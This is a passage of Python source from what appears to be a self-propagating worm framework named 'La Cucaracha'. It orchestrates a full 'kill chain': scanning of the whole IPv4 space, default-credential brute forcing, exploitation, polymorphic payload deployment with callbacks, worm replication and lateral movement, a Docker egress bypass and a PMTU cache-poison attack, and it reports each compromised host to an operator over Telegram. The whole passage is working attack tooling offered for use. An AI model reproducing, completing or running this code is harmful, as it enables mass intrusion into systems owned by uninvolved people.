        self.db.log("Mesh engine reset", "INFO", "mesh")

    # ---- Monte Carlo PRNG -----------------------------------------------------

    def _mc_decision(self, probability: float) -> bool:
        self._monte_carlo_seed = hashlib.sha3_256(
            (str(self._monte_carlo_seed) + str(_current_timestamp())).encode()
        ).digest()
        mc_random = int.from_bytes(self._monte_carlo_seed[:4], "big") / (2 ** 32)
        return mc_random < probability

    def _mc_choice(self, items: List[Any]) -> Any:
        idx_bits = self._monte_carlo_seed[:4]
        idx = int.from_bytes(idx_bits, "big") % len(items)
        self._monte_carlo_seed = hashlib.sha3_256(
            str(self._monte_carlo_seed + idx).encode()
        ).digest()
        return items[idx]

    # ---- Phase 1: Reconnaissance ----------------------------------------------

    def _phase_reconnaissance(self, subnet: str = "0.0.0.0/0") -> int:
        """Phase 1: Execute target discovery."""
        self.db.log("=== Phase 1: Reconnaissance ===", "INFO", "mesh")
        count = self.recon_engine.full_recon(subnet=subnet)
        self.db.log(f"Reconnaissance complete: {count} new targets", "INFO", "mesh")
        return count

    # ---- Phase 1.5: ICMP Sweep -----------------------------------------------

    def _phase_icmp_sweep(self, subnet: str = "0.0.0.0/0") -> int:
        """Phase 1.5: ICMP sweep for live host discovery."""
        try:
            icmp_alive = self.icmp_engine.ping_sweep(subnet=subnet, count=100)
            self.db.log(f"ICMP sweep found {len(icmp_alive)} live hosts", "INFO", "mesh")
            return len(icmp_alive)
        except Exception as exc:
            self.db.log(f"ICMP sweep failed: {exc}", "WARNING", "mesh")
            return 0

    # ---- Phase 2: Exploitation ------------------------------------------------

    def _phase_exploitation(self, batch_size: int = 50, skip_mc: bool = False) -> List[ExploitResult]:
        """Phase 2: Execute exploitation on discovered targets.

        Targets are prioritized: telnet (CVE-2026) > web (IoT exploits) > other > SSH last.
        Periodic progress reports sent every 20 targets during the phase.

        Args:
            batch_size: Max targets to attempt per cycle
            skip_mc: If True, bypass Monte Carlo random skip (for predator mode)
        """
        self.db.log("=== Phase 2: Exploitation ===", "INFO", "mesh")
        targets = self.db.get_targets(unexploited_only=True, limit=batch_size)
        if not targets:
            self.db.log("No unexploited targets available", "INFO", "mesh")
            return []
        results: List[ExploitResult] = []

        # If skip_mc, also feed DB creds into exploit engine for more ammo
        if skip_mc and self.db:
            try:
                db_creds = self.db.get_credentials()
                if db_creds and len(db_creds) > len(getattr(self.exploit_engine, 'cred_pairs', [])):
                    existing = set((u, p) for u, p in getattr(self.exploit_engine, 'cred_pairs', []))
                    for c in db_creds:
                        pair = (c.get('username', c.get('user', '')), c.get('password', c.get('pass', '')))
                        if pair[0] and pair[1] and pair not in existing:
                            self.exploit_engine.cred_pairs.append(pair)
                            existing.add(pair)
                    self.db.log(f"Cred pool boosted: {len(self.exploit_engine.cred_pairs)} total", "INFO", "mesh")
            except Exception:
                pass

        # PRIORITIZE: telnet (23) > web (80,443,8080,8443) > other > SSH (22) last
        PRIORITY_PORTS = {23: 0, 80: 1, 443: 1, 8080: 1, 8443: 1}
        def _priority(t):
            p = int(t.get("port", 22))
            return (PRIORITY_PORTS.get(p, 3 if p == 22 else 2), random.random())
        targets.sort(key=_priority)

        explored_count = 0
        report_interval = max(1, batch_size // 10)  # Report every ~10% of batch
        last_report_time = time.time()

        for i, target in enumerate(targets):
            if self._stop_flag:
                break
            # Skip MC filter when in predator mode (skip_mc=True)
            if not skip_mc and not self._mc_decision(0.85):
                continue
            result = self.exploit_engine.exploit_target(target)
            explored_count += 1
            if result.success:
                results.append(result)
                if result.shell and result.exploit_type in ('ssh_brute', 'ssh_key'):
                    self.db.add_node(ip=target["ip"], port=target["port"], os_name="", public_key="")
                self.db.log(f"SUCCESS: {target['ip']}:{target['port']} via {result.exploit_type}", "INFO", "mesh")
            # Periodic progress report during exploit phase
            now = time.time()
            if explored_count % report_interval == 0 and (now - last_report_time) >= 3.0:
                last_report_time = now
                remaining = len(targets) - i - 1
                pct = int((i + 1) / len(targets) * 100) if targets else 0
                self._send_report(
                    "```\n"
                    f"╔══ 💥 Exploiting ══╗\n"
                    f"║  📊 {i+1}/{len(targets)} ({pct}%)\n"
                    f"║  🏆 Pwned: {len(results)} so far\n"
                    f"║  ⏳ ~{remaining * 3}s remaining\n"
                    f"╚{'═'*22}╝\n"
                    "```"
                )
        return results

    # ---- Phase 3: Payload Generation ------------------------------------------

    def _phase_payload_generation(self, callback_ip: str = "", callback_port: int = 0) -> List[Dict]:
        """Phase 3: Generate polymorphic payloads."""
        self.db.log("=== Phase 3: Payload Generation ===", "INFO", "mesh")
        variants = self.payload_generator.generate_all(
            callback_ip=callback_ip, callback_port=callback_port, persist=True,
        )
        return variants

    # ---- Phase 4: Deployment --------------------------------------------------

    def _phase_deployment(self, exploit_results: List[ExploitResult],
                          payload: Optional[Dict] = None) -> List[DeploymentReport]:
        """Phase 4: Deploy payloads to exploited targets."""
        self.db.log("=== Phase 4: Deployment ===", "INFO", "mesh")
        if not exploit_results:
            return []
        if payload is None:
            all_payloads = self.db.get_payloads()
            if all_payloads:
                payload = random.choice(all_payloads)
            else:
                variants = self.payload_generator.generate_all(persist=True)
                payload = random.choice(variants)
        reports: List[DeploymentReport] = []
        for result in exploit_results:
            if self._stop_flag or not result.success:
                continue
            targets = self.db.get_targets()
            target = None
            for t in targets:
                if t["ip"] == result.target_ip:
                    target = t
                    break
            if not target:
                continue
            report = self.deployment_engine.deploy_to_target(target, result, payload)
            reports.append(report)
            if report.success:
                self.db.log(f"SUCCESS: Deployed to {result.target_ip} via {report.method.value}", "INFO", "mesh")
                try:
                    self.db.execute("DELETE FROM targets WHERE ip = ?", (result.target_ip,))
                    self.db.commit()
                except Exception:
                    pass
        successes = sum(1 for r in reports if r.success)
        self.db.log(f"Deployment complete: {successes}/{len(reports)} successful", "INFO", "mesh")
        return reports

    # ---- Phase 4.5: Docker ICMP Egress Bypass --------------------------------

    def _phase_docker_icmp_bypass(self) -> Dict:
        """Phase 4.5: Scan exploited hosts for Docker and apply ICMP bypass."""
        self.db.log("=== Phase 4.5: Docker ICMP Bypass ===", "INFO", "mesh")
        targets = self.db.get_targets(exploited_only=True, limit=500)
        if not targets:
            return {"total": 0, "docker_found": 0, "bypassed": 0, "containers_unlocked": 0}
        already_bypassed = set()
        try:
            rows = self.db.execute("SELECT ip FROM docker_hosts WHERE icmp_bypassed = 1").fetchall()
            already_bypassed = {r[0] for r in rows}
        except Exception:
            pass
        total = 0; docker_found = 0; bypassed = 0; containers_unlocked = 0
        for target in targets:
            ip = target["ip"]
            if ip in already_bypassed:
                continue
            for username, password in [
                ("root", "root"), ("root", "admin"), ("admin", "admin"),
                ("root", ""), ("admin", ""),
            ]:
                if self._stop_flag:
                    break
                try:
                    result = self.deployment_engine.deploy_docker_icmp_bypass(ip, 22, (username, password))
                    total += 1
                    if result.get("docker_found"):
                        docker_found += 1
                    if result.get("bypass_applied"):
                        bypassed += 1
                        containers_unlocked += result.get("container_count", 0)
                    break
                except Exception:
                    continue
        self.db.log(f"Docker ICMP bypass phase done: {bypassed}/{docker_found} bypassed", "INFO", "mesh")
        return {"total": total, "docker_found": docker_found, "bypassed": bypassed, "containers_unlocked": containers_unlocked}

    # ---- Phase 4.6: PMTU Cache Poison (CVE-2026-0933) ------------------------

    def _phase_pmtu_poison(self) -> Dict:
        """Phase 4.6: CVE-2026-0933 PMTU cache poison."""
        self.db.log("=== Phase 4.6: PMTU Cache Poison (CVE-2026-0933) ===", "INFO", "mesh")
        total = 0; vulnerable = 0; poisoned = 0
        try:
            hosts = self.db.execute(
                "SELECT DISTINCT t.ip, t.port, c.username, c.password FROM targets t "
                "JOIN credentials c ON c.target_ip = t.ip WHERE t.exploited = 1 AND t.active = 1 LIMIT 50"
            ).fetchall() if hasattr(self.db, 'execute') else []
        except Exception:
            hosts = []
        if not hosts:
            return {"total": 0, "vulnerable": 0, "poisoned": 0}
        for row in hosts:
            if self._stop_flag:
                break
            try:
                if isinstance(row, dict):
                    ip, port, user, pw = row["ip"], row.get("port", 22), row["username"], row["password"]
                else:
                    ip, port, user, pw = row[0], row[1] if len(row) > 1 else 22, row[2] if len(row) > 2 else "root", row[3] if len(row) > 3 else ""
                total += 1
                result = self.deployment_engine.deploy_pmtu_poison(ip, int(port), (user, pw), burst=8)
                if result.get("vulnerable"):
                    vulnerable += 1
                if result.get("poison_sent"):
                    poisoned += 1
            except Exception:
                continue
        return {"total": total, "vulnerable": vulnerable, "poisoned": poisoned}

    # ---- Phase 5: Mesh Spread -------------------------------------------------

    def _phase_mesh_spread(self, max_hops: int = 3) -> int:
        """Phase 5: Peer-to-peer mesh expansion."""
        self.db.log("=== Phase 5: Mesh Spread ===", "INFO", "mesh")
        spread_count = 0
        nodes = self.db.get_active_nodes()
        if not nodes:
            self.db.log("No active nodes in mesh", "INFO", "mesh")
            return 0
        targets = self.db.get_targets(unexploited_only=True, limit=200)
        if not targets:
            return 0
        random.shuffle(targets)
        spread_candidates = [t for t in targets if self._mc_decision(0.7)]
        replicator = self.payload_generator.get_payload("worm_replicator")
        if not replicator:
            variants = self.payload_generator.generate_all(persist=True)
            for v in variants:
                if v["variant"] == "worm_replicator":
                    replicator = v; break
        if not replicator:
            return 0
        for target in spread_candidates[:max_hops * 10]:
            if self._stop_flag:
                break
            if not self._mc_decision(0.6):
                continue
            try:
                result = self.exploit_engine.exploit_target(target)
                if result.success:
                    deploy_result = self.deployment_engine.deploy_to_target(target, result, replicator)
                    if deploy_result.success:
                        spread_count += 1
                        self.db.add_node(ip=target["ip"], port=int(target.get("port", 22)), public_key="")
                        if self.node:
                            self.node.add_peer(target["ip"])
                        if spread_count >= max_hops:
                            break
                time.sleep(random.uniform(0.5, 3.0))
            except Exception:
                continue
        return spread_count

    # ---- Phase 6: Trading & Mutation ------------------------------------------

    def _phase_trade_mutation(self) -> Dict:
        """Phase 6: Evolutionary trading and mutation."""
        self.db.log("=== Phase 6: Trading & Mutation ===", "INFO", "mesh")
        results: Dict[str, Any] = {"trades": 0, "mutations": 0, "new_payloads": []}
        successful_deployments = self.db.get_deployments(status="completed", limit=100)
        trade_data = {
            "timestamp": _current_timestamp(),
            "deployment_count": len(successful_deployments),
            "active_nodes": self.db.node_count(),
        }
        self.db.set_mesh_value("trade_data", json.dumps(trade_data))
        results["trades"] = len(successful_deployments)
        existing_payloads = self.db.get_payloads()
        if existing_payloads:
            mutation_candidates = [p for p in existing_payloads if self._mc_decision(0.4)]
            for payload_rec in mutation_candidates[:5]:
                try:
                    if self._stop_flag:
                        break
                    mutated = self.payload_generator.generate_polymorphic_mutation(payload_rec["id"])
                    results["mutations"] += 1
                    results["new_payloads"].append(mutated.get("variant", "unknown"))
                except (ValueError, KeyError):
                    continue
        if results["mutations"] == 0:
            variants = self.payload_generator.generate_all(persist=True)
            results["mutations"] = len(variants)
            results["new_payloads"] = [v["variant"] for v in variants]
        return results

    # ---- ICMP Task Queue (CKAB Layer 5) ----------------------------------------

    def start_icmp_task_worker(self) -> None:
        if self._icmp_task_thread and self._icmp_task_thread.is_alive():
            log.warning("ICMP task worker already running")
            return
        self._icmp_task_running = True
        self._icmp_task_thread = threading.Thread(target=self._icmp_task_worker_loop, daemon=True)
        self._icmp_task_thread.start()
        log.info("ICMP task worker started (CKAB hold-and-release queue)")

    def stop_icmp_task_worker(self) -> None:
        self._icmp_task_running = False
        log.info("ICMP task worker stopped")

    def _icmp_task_worker_loop(self) -> None:
        while self._icmp_task_running and not self._stop_flag:
            try:
                tasks = self.db.execute(
                    "SELECT * FROM icmp_tasks WHERE status='pending' ORDER BY priority DESC LIMIT 3"
                ).fetchall()
                for task in tasks:
                    try:
                        ip = task["target_ip"]
                        target = {"ip": ip, "port": 22, "service": "ssh", "id": task["id"]}
                        result = self.exploit_engine.exploit_target(target)
                        if result.success:
                            self.db.execute("UPDATE icmp_tasks SET status='done', processed_at=? WHERE id=?",
                                            (_current_timestamp(), task["id"]))
                        else:
                            self.db.execute("UPDATE icmp_tasks SET status='timeout', processed_at=? WHERE id=?",
                                            (_current_timestamp(), task["id"]))
                        self.db.commit()
                    except Exception:
                        try:
                            self.db.execute("UPDATE icmp_tasks SET status='timeout', processed_at=? WHERE id=?",
                                            (_current_timestamp(), task.get("id", -1)))
                            self.db.commit()
                        except:
                            pass
                    time.sleep(0.5)
            except Exception:
                pass
            time.sleep(1)

    # ---- Full Kill Chain ------------------------------------------------------

    def run_full_cycle(self, subnet: str = "0.0.0.0/0",
                       batch_size: int = 100,
                       max_spread_hops: int = 5,
                       aggressive: bool = False,
                       fingerprint_deep: bool = True) -> Dict:
        """
        COMPLETE PREDATOR KILL CHAIN — Full spectrum attack sequence.

        Stage 0:  Subnet Discovery (auto-detect local networks)
        Stage 1:  ICMP Sweep (find alive hosts)
        Stage 2:  TCP Sweep (find open ports on alive hosts)
        Stage 3:  Fingerprinting (service/OS/banner detection)
        Stage 4:  Target Scoring & Prioritization
        Stage 5:  Exploitation (targeted based on fingerprint)
        Stage 6:  Payload Generation (polymorphic, targeted)
        Stage 7:  Deployment (multi-vector, parallel)
        Stage 8:  Lateral Movement (pivot through compromised hosts)
        Stage 9:  Mesh Expansion (peer-to-peer spreading)
        Stage 10: Trading & Mutation (evolutionary adaptation)
        """
        self.db.log("=" * 70, "INFO", "mesh")
        self.db.log("🐉 LA CUCARACHA — PREDATOR KILL CHAIN 🐉", "INFO", "mesh")
        self.db.log("=" * 70, "INFO", "mesh")

        start_time = time.time()

        phase_results: Dict[str, Any] = {
            "subnets_discovered": 0,
            "icmp_sweep": 0,
            "tcp_sweep": 0,
            "fingerprinted": 0,
            "targets_scored": 0,
            "exploitation": 0,
            "exploit_details": [],
            "payload_generation": 0,
            "deployment": 0,
            "lateral_moves": 0,
            "mesh_spread": 0,
            "docker_bypass": 0,
            "pmtu_poison": 0,
            "trading_mutation": {},
            "total_time": 0,
        }

        # ====================================================================
        # STAGE 0: SUBNET DISCOVERY (Auto-detect local networks)
        # ====================================================================
        self.db.log("🕸️ STAGE 0: SUBNET DISCOVERY", "INFO", "mesh")

        discovered_subnets = self._discover_local_subnets()
        if discovered_subnets:
            phase_results["subnets_discovered"] = len(discovered_subnets)
            # Add discovered subnets to scan list
            scan_subnets = [subnet] + discovered_subnets[:3]
        else:
            scan_subnets = [subnet]

        self.db.log(f"📡 Found {len(discovered_subnets)} local subnets", "INFO", "mesh")

        # ====================================================================
        # STAGE 1: ICMP SWEEP (Find alive hosts)
        # ====================================================================
        self.db.log("📡 STAGE 1: ICMP SWEEP", "INFO", "mesh")

        alive_hosts = []

        # Check root — skip ICMP if not root, go straight to masscan
        have_root = (os.geteuid() == 0) if hasattr(os, 'geteuid') else False
        if have_root:
            icmp = ICMPEngine(self.db, timeout=2, rate_limit=100)
            # Parallel ICMP sweep across multiple subnets
            with ThreadPoolExecutor(max_workers=min(len(scan_subnets), 10)) as icmp_executor:
                futures = []
                for sn in scan_subnets[:5]:
                    futures.append(icmp_executor.submit(
                        icmp.ping_sweep, sn, 255
                    ))
                for f in futures:
                    try:
                        result = f.result(timeout=30)
                        alive_hosts.extend(result)
                    except Exception as e:
                        self.db.log(f"ICMP sweep failed: {e}", "WARNING", "mesh")
            alive_hosts = list(set(alive_hosts))
            phase_results["icmp_sweep"] = len(alive_hosts)
            # Filter blocked
            alive_hosts = [h for h in alive_hosts if not is_blocked(h)]
            self.db.log(f"📡 ICMP sweep: {len(alive_hosts)} alive hosts", "INFO", "mesh")
            # Telegram: ICMP sweep report
            if len(alive_hosts) > 0:
                self._send_report(
                    "```\n"
                    f"╔══ 📡 STAGE 1: ICMP SWEEP ══╗\n"
                    f"║  🟢 Alive: {len(alive_hosts)}\n"
                    f"╚{'═'*27}╝\n"
                    "```"
                )
        else:
            self.db.log("⚠️ Not root — skipping ICMP, falling back directly to masscan TCP sweep", "WARNING", "mesh")

        if not alive_hosts:
            self.db.log("⚠️ ICMP sweep returned 0 — falling back to masscan TCP sweep", "WARNING", "mesh")
            # Fallback: use masscan directly (works without root)
            masscan_ports = "22,23,80,443,8080,8443,3306,5432,6379,27017,1883"
            masscan_results = self.recon_engine.masscan_scan(subnet=scan_subnets[0], ports=masscan_ports)
            if not masscan_results:
                self.db.log(f"🟡 masscan_scan returned 0 hits — skipping", "WARNING", "mesh")
            else:
                self.db.log(f"🟢 masscan_scan returned {len(masscan_results)} hits", "INFO", "mesh")
            for entry in masscan_results:
                ip = entry.split(":")[0] if ":" in entry else entry
                if ip and not _is_blocked(ip):
                    alive_hosts.append(ip)
            alive_hosts = list(set(alive_hosts))
            if not alive_hosts:
                self.db.log("⚠️ No alive hosts found. Skipping kill chain.", "WARNING", "mesh")
                return phase_results
            self.db.log(f"📡 masscan fallback: {len(alive_hosts)} alive hosts", "INFO", "mesh")

        # ====================================================================
        # STAGE 2: TCP SWEEP (Find open ports on alive hosts)
        # ====================================================================
        self.db.log("🔍 STAGE 2: TCP SWEEP", "INFO", "mesh")

        tcp_ports = [22, 23, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 1883,
                     500, 4500, 2375, 2376, 9200, 9300, 11211, 5900, 3389,
                     21, 25, 110, 143, 993, 995, 465, 587, 53, 123, 161, 389,
                     636, 3268, 3269, 5672, 15672, 61613, 61614, 9092, 2181,
                     8088, 8000, 8008, 8444, 9000, 9100, 5000, 5001]

        # Use aggressive port list if in aggressive mode
        if aggressive:
            targeted_extra = [81, 591, 2080, 4443, 5001, 8001, 8081, 8082, 
                              8444, 8834, 10000, 20000, 31337, 32768, 49152,
                              50000, 50001, 50002, 50003, 65535]
            tcp_ports = tcp_ports + targeted_extra + [random.randint(1024, 65535) for _ in range(20)]

        # Parallel TCP sweep
        open_targets = []
        tcp_sweep_results = []

        with ThreadPoolExecutor(max_workers=20) as tcp_executor:
            futures = []
            for ip in alive_hosts[:200]:  # Limit to 200 hosts per sweep
                futures.append(tcp_executor.submit(
                    self._tcp_scan_worker, ip, tcp_ports
                ))

            for f in futures:
                try:
                    result = f.result(timeout=30)
                    if result:
                        tcp_sweep_results.extend(result)
                except Exception as e:
                    self.db.log(f"TCP scan failed: {e}", "DEBUG", "mesh")

        # Deduplicate and add to database
        for entry in tcp_sweep_results:
            ip = entry.get("ip")
            port = entry.get("port")
            if ip and port:
                self.db.add_target(
                    ip=ip,
                    port=port,
                    protocol="tcp",
                    scan_source="tcp_sweep",
                    service=entry.get("service", "")
                )
                open_targets.append(entry)

        phase_results["tcp_sweep"] = len(open_targets)
        self.db.log(f"🔍 TCP sweep: {len(open_targets)} open ports found", "INFO", "mesh")

        # Telegram: TCP sweep report
        if len(open_targets) > 0:
            top_tcp = "\n".join(
                f"║  🔓 {t.get('ip')}:{t.get('port')}"
                for t in open_targets[:5]
            )
            if len(open_targets) > 5:
                top_tcp += f"\n║  ... +{len(open_targets) - 5} more"
            self._send_report(
                "```\n"
                f"╔══ 🔍 STAGE 2: TCP SWEEP ══╗\n"
                f"║  🔓 Open ports: {len(open_targets)}\n"
                f"{top_tcp}\n"
                f"╚{'═'*26}╝\n"
                "```"
            )

        if not open_targets:
            self.db.log("⚠️ No open ports found. Skipping kill chain.", "WARNING", "mesh")
            return phase_results

        # ====================================================================
        # STAGE 3: FINGERPRINTING (Service/OS/Banner detection)
        # ====================================================================
        self.db.log("🖥️ STAGE 3: FINGERPRINTING", "INFO", "mesh")

        fingerprinted = []

        # Only fingerprint if deep fingerprinting is enabled
        if fingerprint_deep:
            # Group targets by IP for efficient fingerprinting
            targets_by_ip = {}
            for entry in open_targets:
                ip = entry.get("ip")
                if ip not in targets_by_ip:
                    targets_by_ip[ip] = []
                targets_by_ip[ip].append(entry.get("port"))

            # Parallel fingerprinting
            with ThreadPoolExecutor(max_workers=10) as fp_executor:
                futures = []
                for ip, ports in list(targets_by_ip.items())[:50]:  # Limit to 50 hosts
                    futures.append(fp_executor.submit(
                        self._fingerprint_worker, ip, ports
                    ))

                for f in futures:
                    try:
                        result = f.result(timeout=30)
                        if result:
                            fingerprinted.append(result)
                    except Exception as e:
                        self.db.log(f"Fingerprint failed: {e}", "DEBUG", "mesh")

            # Update database with fingerprint data
            for fp in fingerprinted:
                ip = fp.get("ip")
                os_guess = fp.get("os_guess", "unknown")
                services = fp.get("services", {})

                for port, service_data in services.items():
                    # Update target with fingerprint data
                    service_name = service_data.get("name", "")
                    banner = service_data.get("banner", "")

                    # Find the target in DB and update
                    self.db.execute(
                        """UPDATE targets SET os_guess = ?, service = ?, banner = ?
                           WHERE ip = ? AND port = ?""",
                        (os_guess, service_name, banner, ip, port)
                    )
                    self.db.commit()

        phase_results["fingerprinted"] = len(fingerprinted)
        self.db.log(f"🖥️ Fingerprinted: {len(fingerprinted)} hosts", "INFO", "mesh")

        # Telegram: fingerprinting report
        if len(fingerprinted) > 0:
            fp_lines = "\n".join(
                f"║  🖥️ {fp.get('ip')} — {fp.get('os_guess', 'unknown')}"
                for fp in fingerprinted[:5]
            )
            if len(fingerprinted) > 5:
                fp_lines += f"\n║  ... +{len(fingerprinted) - 5} more"
            self._send_report(
                "```\n"
                f"╔══ 🖥️ STAGE 3: FINGERPRINT ══╗\n"
                f"{fp_lines}\n"
                f"╚{'═'*27}╝\n"
                "```"
            )

        # ====================================================================
        # STAGE 4: TARGET SCORING & PRIORITIZATION
        # ====================================================================
        self.db.log("🎯 STAGE 4: TARGET SCORING", "INFO", "mesh")

        scored_targets = self._score_targets(open_targets)
        phase_results["targets_scored"] = len(scored_targets)

        # Sort by score (highest first)
        scored_targets.sort(key=lambda x: x.get("score", 0), reverse=True)

        # Log top targets
        for i, t in enumerate(scored_targets[:5]):
            self.db.log(
                f"🎯 #{i+1} {t.get('ip')}:{t.get('port')} "
                f"score={t.get('score')} | OS={t.get('os_guess', 'unknown')} | "
                f"service={t.get('service', 'unknown')}",
                "INFO", "mesh"
            )

        # Telegram: scoring report
        if len(scored_targets) > 0:
            score_lines = "\n".join(
                f"║  🎯 {t.get('ip')}:{t.get('port')} [{t.get('score')}pts]"
                for i, t in enumerate(scored_targets[:5])
            )
            if len(scored_targets) > 5:
                score_lines += f"\n║  ... +{len(scored_targets) - 5} more"
            self._send_report(
                "```\n"
                f"╔══ 🎯 STAGE 4: SCORING ══╗\n"
                f"║  📊 Scored: {len(scored_targets)} targets\n"
                f"{score_lines}\n"
                f"╚{'═'*26}╝\n"
                "```"
            )

        if not scored_targets:
            self.db.log("⚠️ No scored targets. Skipping exploitation.", "WARNING", "mesh")
            return phase_results

        # ====================================================================
        # STAGE 5: EXPLOITATION (Targeted based on fingerprint)
        # ====================================================================
        self.db.log("⚡ STAGE 5: TARGETED EXPLOITATION", "INFO", "mesh")

        exploit_results = []
        targets_to_exploit = scored_targets[:batch_size]

        # Parallel exploitation with fingerprint-aware targeting
        with ThreadPoolExecutor(max_workers=15) as exploit_executor:
            futures = []
            for target in targets_to_exploit:
                futures.append(exploit_executor.submit(
                    self._exploit_target_with_fingerprint, target
                ))

            for f in futures:
                try:
                    result = f.result(timeout=45)
                    if result and result.success:
                        exploit_results.append(result)
                        self.db.log(
                            f"⚡ Exploited {result.target_ip}:{result.target_port} "
                            f"via {result.exploit_type.value}",
                            "INFO", "mesh"
                        )
                        # Telegram: immediate per-pwn alert
                        self._send_report(
                            "```\n"
                            f"╔══ 💀 PWND ══╗\n"
                            f"║  🎯 {result.target_ip}:{result.target_port}\n"
                            f"║  🔧 {result.exploit_type.value}\n"
                            f"╚{'═'*16}╝\n"
                            "```"
                        )
                except Exception as e:
                    self.db.log(f"Exploit failed: {e}", "DEBUG", "mesh")

        phase_results["exploitation"] = len(exploit_results)
        phase_results["exploit_details"] = [
            {
                "ip": r.target_ip,
                "port": r.target_port,
                "method": r.exploit_type.value if isinstance(r.exploit_type, str) else r.exploit_type.value,
                "credential": r.credential
            }
            for r in exploit_results
        ]

        self.db.log(f"⚡ Exploitation complete: {len(exploit_results)} targets pwned", "INFO", "mesh")

        # Send pwn report to Telegram
        if len(exploit_results) > 0:
            pwn_list = "\n".join(
                f"║  💀 {r.target_ip}:{r.target_port}"
                for r in exploit_results[:8]
            )
            if len(exploit_results) > 8:
                pwn_list += f"\n║  ... +{len(exploit_results) - 8} more"
            self._send_report(
                "```\n"
                f"╔══ ⚡ STAGE 5: EXPLOITATION ══╗\n"
                f"║  🔓 Total pwned: {len(exploit_results)}\n"
                f"{pwn_list}\n"
                f"╚{'═'*29}╝\n"
                "```"
            )

        if not exploit_results:
            self.db.log("⚠️ No targets exploited. Skipping deployment.", "WARNING", "mesh")
            return phase_results

        # ====================================================================
        # STAGE 6: PAYLOAD GENERATION (Polymorphic, targeted)
        # ====================================================================
        self.db.log("📦 STAGE 6: POLYMORPHIC PAYLOAD GENERATION", "INFO", "mesh")

        # Generate payloads tailored to exploited targets
        payloads = []
        for result in exploit_results[:10]:
            # Generate payload with OS-specific features
            os_type = result.os_type if hasattr(result, 'os_type') else "unknown"
            payload = self.payload_generator.generate_all(
                callback_ip=self._get_callback_ip(result.target_ip),
                callback_port=_rand_port(),
                persist=True,
                os_target=os_type
            )
            payloads.extend(payload)

        phase_results["payload_generation"] = len(payloads)
        self.db.log(f"📦 Generated {len(payloads)} payloads", "INFO", "mesh")

        # ====================================================================
        # STAGE 7: DEPLOYMENT (Multi-vector, parallel)
        # ====================================================================
        self.db.log("🚀 STAGE 7: DEPLOYMENT", "INFO", "mesh")

        deploy_reports = []
        with ThreadPoolExecutor(max_workers=10) as deploy_executor:
            futures = []
            for i, result in enumerate(exploit_results[:20]):
                payload = payloads[i % len(payloads)] if payloads else None
                target = {"ip": result.target_ip, "port": result.target_port}
                futures.append(deploy_executor.submit(
                    self.deployment_engine.deploy_to_target,
                    target, result, payload
                ))

            for f in futures:
                try:
                    report = f.result(timeout=60)
                    deploy_reports.append(report)
                    if report.success:
                        self.db.log(
                            f"🚀 Deployed to {report.target_ip} via {report.method.value}",
                            "INFO", "mesh"
                        )
                except Exception as e:
                    self.db.log(f"Deploy failed: {e}", "DEBUG", "mesh")

        phase_results["deployment"] = sum(1 for r in deploy_reports if r.success)
        self.db.log(f"🚀 Deployment complete: {phase_results['deployment']} successful", "INFO", "mesh")

        # Telegram: deployment report
        if phase_results["deployment"] > 0:
            dep_lines = "\n".join(
                f"║  🚀 {r.target_ip} via {r.method.value if hasattr(r, 'method') else 'ssh'}"
                for r in deploy_reports[:5] if r.success
            )
            if phase_results["deployment"] > 5:
                dep_lines += f"\n║  ... +{phase_results['deployment'] - 5} more"
            self._send_report(
                "```\n"
                f"╔══ 🚀 STAGE 7: DEPLOY ══╗\n"
                f"║  ✅ Success: {phase_results['deployment']}/{len(deploy_reports)}\n"
                f"{dep_lines}\n"
                f"╚{'═'*25}╝\n"
                "```"
            )

        # ====================================================================
        # STAGE 8: LATERAL MOVEMENT (Pivot through compromised hosts)
        # ====================================================================
        self.db.log("🔄 STAGE 8: LATERAL MOVEMENT", "INFO", "mesh")

        lateral_count = 0
        if exploit_results:
            lateral_moves = self._execute_lateral_movement(exploit_results[:10])
            lateral_count = len(lateral_moves)

        phase_results["lateral_moves"] = lateral_count
        self.db.log(f"🔄 Lateral movement: {lateral_count} pivots", "INFO", "mesh")

        # Telegram: lateral movement report
        if lateral_count > 0:
            self._send_report(
                "```\n"
                f"╔══ 🔄 STAGE 8: LATERAL ══╗\n"
                f"║  🔄 Pivots: {lateral_count}\n"
                f"╚{'═'*25}╝\n"
                "```"
            )

        # ====================================================================
        # STAGE 9: MESH EXPANSION
        # ====================================================================
        self.db.log("🕸️ STAGE 9: MESH EXPANSION", "INFO", "mesh")
        phase_results["mesh_spread"] = self._phase_mesh_spread(max_hops=max_spread_hops)

        # Telegram: mesh expansion report
        if phase_results["mesh_spread"] > 0:
            self._send_report(
                "```\n"
                f"╔══ 🕸️ STAGE 9: MESH ══╗\n"
                f"║  🕸️ Spreads: {phase_results['mesh_spread']}\n"
                f"╚{'═'*28}╝\n"
                "```"
            )

        # ====================================================================
        # STAGE 10: TRADING & MUTATION
        # ====================================================================
        self.db.log("🧬 STAGE 10: TRADING & MUTATION", "INFO", "mesh")
        phase_results["trading_mutation"] = self._phase_trade_mutation()

        # Telegram: trading & mutation report
        tm = phase_results["trading_mutation"]
        if isinstance(tm, dict):
            tm_trades = tm.get("trades", 0)
            tm_mutations = tm.get("mutations", 0)
            if tm_trades > 0 or tm_mutations > 0:
                self._send_report(
                    "```\n"
                    f"╔══ 🧬 STAGE 10: TRADE ══╗\n"
                    f"║  🧬 Trades: {tm_trades}\n"
                    f"║  🧬 Mutations: {tm_mutations}\n"
                    f"╚{'═'*25}╝\n"
                    "```"
                )

        # ====================================================================
        # SUMMARY
        # ====================================================================
        phase_results["total_time"] = time.time() - start_time

        self.db.log("=" * 70, "INFO", "mesh")
        self.db.log(f"🐉 KILL CHAIN COMPLETE — {phase_results['total_time']:.2f}s", "INFO", "mesh")
        self.db.log(f"  📡 ICMP sweep:        {phase_results['icmp_sweep']} alive hosts", "INFO", "mesh")
        self.db.log(f"  🔍 TCP sweep:         {phase_results['tcp_sweep']} open ports", "INFO", "mesh")
        self.db.log(f"  🖥️ Fingerprinted:      {phase_results['fingerprinted']} hosts", "INFO", "mesh")
        self.db.log(f"  🎯 Targets scored:     {phase_results['targets_scored']}", "INFO", "mesh")
        self.db.log(f"  ⚡ Exploited:          {phase_results['exploitation']} targets", "INFO", "mesh")
        self.db.log(f"  🚀 Deployed:           {phase_results['deployment']} payloads", "INFO", "mesh")
        self.db.log(f"  🔄 Lateral moves:      {phase_results['lateral_moves']}", "INFO", "mesh")
        self.db.log(f"  🕸️ Mesh spread:        {phase_results['mesh_spread']}", "INFO", "mesh")
        self.db.log("=" * 70, "INFO", "mesh")

        # Send Telegram kill chain summary
        self._send_report(
            "```\n"
            f"╔══ 🐉 Predator Kill Chain ══╗\n"
